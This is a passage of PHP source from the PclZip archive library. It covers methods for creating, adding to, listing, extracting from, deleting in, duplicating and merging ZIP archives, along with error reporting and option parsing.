                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
